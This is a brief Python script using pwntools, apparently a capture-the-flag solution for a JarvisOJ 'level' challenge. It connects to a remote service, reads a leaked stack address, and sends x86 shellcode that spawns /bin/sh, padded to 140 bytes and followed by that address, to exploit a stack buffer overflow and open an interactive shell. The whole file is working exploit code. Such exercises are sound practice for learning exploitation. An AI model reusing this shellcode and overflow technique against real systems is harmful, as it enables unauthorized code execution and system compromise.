# encoding:utf-8
from pwn import *

shellcode_x86 =  "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"           
shellcode_x86 += "\x0b\xcd\x80"
# sh = process("./level")
sh = remote("pwn2.jarvisoj.com" , 9877 )

temp = sh.recv()
addr = temp.split("\n")[0].split(":")[1].split("?")[0] # 获取输入起始地址 #程序中给出
addr = int(addr , 16)
payload = shellcode_x86 +  (140 - len(shellcode_x86) ) * 'A' +  p32(addr) 

sh.sendline(payload)
sh.interactive()